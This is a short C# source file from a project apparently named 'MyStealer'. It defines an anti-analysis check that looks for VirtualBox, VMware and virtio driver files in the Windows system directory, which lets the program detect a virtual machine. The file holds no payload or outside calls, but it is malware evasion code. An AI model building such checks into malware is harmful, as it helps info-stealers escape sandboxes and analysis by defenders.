﻿using System;
using System.IO;


namespace MyStealer.AntiDebug.Check
{
    /// <summary>
    /// Check if there is any suspicious driver files are found on system directory. (/system32, /system32/drivers)
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiVirtualization.cs#L96
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiVirtualization.cs#L142
    /// </summary>
    internal class Drivers : CheckBase
    {
        public override string Name => "Drivers";

        private readonly string[] driverNames = new string[]
        {
            "netkvm.sys", // NetKVM

            "balloon.sys", // virtio-win
            "vioinput.sys", //virtio-win
            "viofs.sys", // virtio-win
            "vioser.sys", // virtio-win

            "vboxmouse.sys", // VirtualBox
            "vboxguest.sys", // VirtualBox
            "vboxsf.sys", // VirtualBox
            "vboxvideo.sys", // VirtualBox
            "vboxogl.dll", // VirtualBox

            "vmmouse.sys", // vmware
        };

        public override bool CheckPassive()
        {
            foreach (var name in driverNames)
            {
                if (File.Exists(Path.Combine(Environment.SystemDirectory, name)) || File.Exists(Path.Combine(Environment.SystemDirectory, "drivers", name)))
                {
                    Logger.Information("Bad driver {name} found.", name);
                    return true;
                }
            }

            return false;
        }
    }
}
